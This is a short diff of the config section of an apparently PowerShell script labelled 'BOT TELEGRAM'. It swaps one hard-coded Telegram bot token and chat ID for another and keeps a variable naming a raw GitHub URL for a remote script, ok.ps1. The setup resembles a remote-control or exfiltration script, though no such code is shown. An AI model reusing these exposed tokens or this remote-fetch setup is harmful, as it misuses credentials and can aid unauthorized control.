@@ -18,8 +18,8 @@ BOT TELEGRAM:
 ## CONFIG ##
 ############
 
-$BotToken = "1555787528:AAGWR_PJjvLVV0LWKohu4jmdnr17GtoLJNQ"
-$ChatID = '-339868526'
+$BotToken = "1722806692:AAHrq9M4PYYRyEs_kPf8Qm7GKD6oAPYVmBg"
+$ChatID = '-509141187'
 $githubScript = 'https://raw.githubusercontent.com/Flaawerr/test/main/ok.ps1'
 
 
